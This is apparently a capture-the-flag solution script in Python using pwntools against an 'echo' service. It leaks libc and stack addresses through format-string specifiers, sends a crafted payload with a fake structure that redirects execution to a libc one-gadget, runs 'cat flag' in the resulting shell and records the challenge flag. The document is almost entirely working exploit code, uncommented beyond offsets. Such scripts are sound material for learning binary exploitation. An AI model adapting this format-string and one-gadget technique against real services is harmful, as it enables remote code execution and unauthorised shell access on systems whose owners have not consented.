#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = remote("echo.stillhackinganyway.nl", 1337)

# leak libc
r.sendline("%155$p")
libc = int(r.recvline().split()[-1],16) - 0x20830
log.info("libc = " + hex(libc))

# leak stack
r.sendline("%140$p")
fmt = int(r.recvline().split()[-1],16) - 1360
log.info("fmt = " + hex(fmt))

payload = "%13$@\0\0\0" + p64(fmt+16) 
payload += p64(fmt+24-0x40) # +16
payload += p64(fmt+32)
payload += p64(fmt+72)  # +32 v4
payload += p64(0)       # +40
payload += p64(0)       # +48
payload += p64(0)       # +56
payload += p64(0)       # +64  v4 + 40
payload += p64(0xffffffff) # +72
payload += p64(0)       # +80
payload += p64(0)       # +88
payload += p64(fmt+104-0x80) # +96
payload += p64(libc+0x4526a)
r.sendline(payload)

r.sendline("cat flag")
r.interactive()

# flag{32ee124c49e3de4555b0f1c063539ef0}
